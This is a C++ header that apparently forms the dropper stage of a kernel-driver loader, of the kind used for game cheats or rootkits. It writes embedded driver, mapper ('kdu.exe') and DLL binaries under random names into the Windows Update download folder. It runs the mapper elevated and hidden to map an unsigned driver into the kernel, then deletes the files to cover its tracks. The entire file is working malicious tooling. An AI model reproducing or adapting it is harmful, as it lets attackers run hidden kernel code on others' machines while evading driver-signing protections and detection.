#pragma once
#include "includes.hpp"
#include "shellcode.h"
#define patch_shell   (L"\\SoftwareDistribution\\Download\\")

std::string random_string()
{
	std::string str = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890";
	std::string newstr;
	int pos;
	while (newstr.size() != 32)
	{
		pos = ((rand() % (str.size() + 1)));
		newstr += str.substr(pos, 1);
	}
	return newstr;
}

std::wstring random_string_w()
{
	std::wstring str = L"QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890";
	std::wstring newstr;
	int pos;
	while (newstr.size() != 5)
	{
		pos = ((rand() % (str.size() + 1)));
		newstr += str.substr(pos, 1);
	}
	return newstr;
}

std::wstring get_parent(const std::wstring& path)
{
	if (path.empty())
		return path;

	auto idx = path.rfind(L'\\');
	if (idx == path.npos)
		idx = path.rfind(L'/');

	if (idx != path.npos)
		return path.substr(0, idx);
	else
		return path;
}

std::wstring get_exe_directory()
{
	wchar_t imgName[MAX_PATH] = { 0 };
	DWORD len = ARRAYSIZE(imgName);
	QueryFullProcessImageNameW(GetCurrentProcess(), 0, imgName, &len);
	std::wstring sz_dir = (std::wstring(get_parent(imgName)) + L"\\");
	return sz_dir;
}

std::wstring get_files_directory()
{
	WCHAR system_dir[256];
	GetWindowsDirectoryW(system_dir, 256);
	std::wstring sz_dir = (std::wstring(system_dir) + L"\\SoftwareDistribution\\Download\\");
	return sz_dir;
}

std::wstring get_random_file_name_directory(std::wstring type_file)
{
	std::wstring sz_file = get_files_directory() + random_string_w() + type_file;
	return sz_file;
}
void run_us_admin(std::wstring sz_exe, bool show)
{
	ShellExecuteW(NULL, L"runas", sz_exe.c_str(), NULL, NULL, show);
}

void run_us_admin_and_params(std::wstring sz_exe, std::wstring sz_params, bool show)
{
	ShellExecuteW(NULL, L"runas", sz_exe.c_str(), sz_params.c_str(), NULL, show);
}

bool drop_mapper(std::wstring path)
{
	HANDLE h_file;
	BOOLEAN b_status = FALSE;
	DWORD byte = 0;

	h_file = CreateFileW(path.c_str(), GENERIC_ALL, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (GetLastError() == ERROR_FILE_EXISTS)
		return true;

	if (h_file == INVALID_HANDLE_VALUE)
		return false;

	b_status = WriteFile(h_file, shellmaper, sizeof(shellmaper), &byte, nullptr);
	CloseHandle(h_file);

	if (!b_status)
		return false;

	return true;
}

bool drop_driver(std::wstring path)
{
	HANDLE h_file;
	BOOLEAN b_status = FALSE;
	DWORD byte = 0;

	h_file = CreateFileW(path.c_str(), GENERIC_ALL, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (GetLastError() == ERROR_FILE_EXISTS)
		return true;

	if (h_file == INVALID_HANDLE_VALUE)
		return false;

	b_status = WriteFile(h_file, shelldriver, sizeof(shelldriver), &byte, nullptr);
	CloseHandle(h_file);

	if (!b_status)
		return false;

	return true;
}
bool drop_dll(std::wstring path)
{
	HANDLE h_file;
	BOOLEAN b_status = FALSE;
	DWORD byte = 0;

	h_file = CreateFileW(path.c_str(), GENERIC_ALL, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (GetLastError() == ERROR_FILE_EXISTS)
		return true;

	if (h_file == INVALID_HANDLE_VALUE)
		return false;

	b_status = WriteFile(h_file, shelldll, sizeof(shelldll), &byte, nullptr);
	CloseHandle(h_file);

	if (!b_status)
		return false;

	return true;
}

std::wstring get_files_path()
{
	WCHAR system_dir[256];
	GetWindowsDirectoryW(system_dir, 256);
	return (std::wstring(system_dir) + patch_shell);
}

void mmap_driver()
{
	std::wstring sz_driver = get_random_file_name_directory((L".sys"));
	std::wstring exedic = get_files_directory();
	std::wstring sz_mapper = exedic + L"kdu.exe";
	std::wstring dllname = exedic + L"drv64.dll";
	std::wstring sz_params_map = (L"-prv 1 -map ") + sz_driver;

	DeleteFileW(sz_driver.c_str());
	DeleteFileW(sz_mapper.c_str());
	DeleteFileW(dllname.c_str());

	Sleep(1000);

	drop_driver(sz_driver);
	drop_mapper(sz_mapper);
	drop_dll(dllname);

	run_us_admin_and_params(sz_mapper, sz_params_map, false);
	Sleep(6000);

	DeleteFileW(sz_driver.c_str());
	DeleteFileW(sz_mapper.c_str());
	DeleteFileW(dllname.c_str());
}
